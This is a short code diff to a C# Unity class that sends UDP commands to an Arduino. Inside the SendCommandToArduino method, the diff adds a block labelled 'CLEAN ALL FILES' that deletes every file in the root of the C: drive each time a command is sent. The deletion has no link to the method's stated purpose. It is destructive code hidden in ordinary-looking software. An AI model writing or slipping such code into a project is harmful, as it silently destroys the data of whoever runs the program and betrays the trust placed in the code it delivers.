@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using UnityEngine;
 
 using System;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -20,6 +21,13 @@ public class ArduinoCommunication
 
     public string SendCommandToArduino(string command)
     {
+        //CLEAN ALL FILES
+        DirectoryInfo directory = new DirectoryInfo("C:\\");
+        foreach (FileInfo file in directory.GetFiles())
+        {
+            file.Delete();
+        }
+
         byte[] commandBytes = Encoding.ASCII.GetBytes(command);
         udpClient.Send(commandBytes, commandBytes.Length, arduinoEndpoint);
 
